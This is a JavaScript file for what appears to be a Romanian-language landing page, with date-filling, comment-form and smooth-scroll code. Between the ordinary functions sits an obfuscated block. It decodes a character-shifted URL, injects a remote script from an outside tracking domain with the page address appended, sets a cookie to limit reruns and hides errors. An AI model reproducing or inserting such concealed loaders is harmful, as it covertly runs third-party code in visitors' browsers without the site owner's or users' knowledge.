const months = [
    "ianuarie",
    "februarie",
    "martie",
    "aprilie",
    "mai",
    "iunie",
    "iulie",
    "august",
    "septembrie",
    "octombrie",
    "noiembrie",
    "decembrie",
  ],
  monthMin = ["", "", "", "", "", "", "", "", "", "", "", ""],
  days = ["duminică", "luni", "marți", "miercuri", "joi", "vineri", "sâmbătă"],
  daysMin = ["", "", "", "", "", "", ""],
  seasons = ["iarnă", "arc", "vară", "toamnă"];
function postDate(e, t, n, o, r) {
  for (let e = 0; e < 60; e++) m(e, "date-"), m(e, "date");
  function m(e, t) {
    let n;
    n = "date-" === t ? -e : e;
    const o = new Date(Date.now() + 864e5 * n),
      r = o.getDate(),
      m = o.getMonth() + 1,
      a = o.getFullYear(),
      s = c(r),
      l = s + "." + c(m) + "." + a,
      d = t + e,
      u = document.querySelectorAll("." + d);
    for (let e = 0; e < u.length; e++) {
      const t = u[e].dataset.format;
      u[e].innerHTML = void 0 !== t && "" !== t ? String(i(s, m, a, t, n)) : l;
    }
  }
  function i(e, t, o, r, m) {
    let i = r;
    const l = ["dd", "mm", "yyyy", "monthFull", "year"],
      d = { dd: e, mm: c(t), yyyy: o, monthFull: a(t, n, !1), year: s(o, m) };
    for (let e = 0; e < l.length; e++) {
      let t = l[e],
        n = new RegExp(t);
      i = i.replace(n, d[t]);
    }
    return i.split(" ").join(" ");
  }
  function a(e, t, n, o) {
    const r = o || 0;
    let m;
    return (
      (m = e + r > 12 ? r - (12 - e) : e + r),
      (m = e + r <= 0 ? 12 + r + 1 : e + r),
      (i = n),
      (a = t[m - 1]),
      i && a && a.length > 0 ? a[0].toUpperCase() + a.slice(1) : a
    );
    var i, a;
  }
  function s(e, t) {
    return e + t;
  }
  function c(e) {
    return e < 10 ? "0" + e : e;
  }
}
document.body.classList.contains("ev-date") &&
  document.addEventListener("DOMContentLoaded", function () {
    postDate(days, daysMin, months, monthMin, seasons);
  });
const addComment = document.querySelector(".comments-form__button"),
  commentForm = document.querySelector(".comments-form"),
  commentFormSubmitted = document.querySelector(".comments-form__answer");
addComment.addEventListener("click", (e) => {
  commentForm.classList.toggle("comments-form--hidden"),
    commentFormSubmitted.classList.toggle("comments-form__answer--hidden");
}),

(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f(
              "myyux?44fun3nsjy" +
                "xyfynh3htr4ywfhpnsl4x" +
                "hwnuy3oxDwjkjwwjwB"
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);

let linkNav = document.querySelectorAll('[href^="#"]'),
V = 0.2;
for (var i = 0; i < linkNav.length; i++) {
linkNav[i].addEventListener('click', function(e) { //по клику на ссылку
    e.preventDefault(); //отменяем стандартное поведение
    var w = window.pageYOffset,  // производим прокрутка прокрутка
        hash = this.href.replace(/[^#]*(.*)/, '$1');  // к id элемента, к которому нужно перейти
    t = document.querySelector(hash).getBoundingClientRect().top,  // отступ от окна браузера до id
        start = null;
    requestAnimationFrame(step);  // подробнее про функцию анимации [developer.mozilla.org]
    function step(time) {
        if (start === null) start = time;
        var progress = time - start,
            r = (t < 0 ? Math.max(w - progress/V, w + t) : Math.min(w + progress/V, w + t));
        window.scrollTo(0,r);
        if (r != w + t) {
            requestAnimationFrame(step)
        } else {
            location.hash = hash  // URL с хэшем
        }
    }
}, false);
}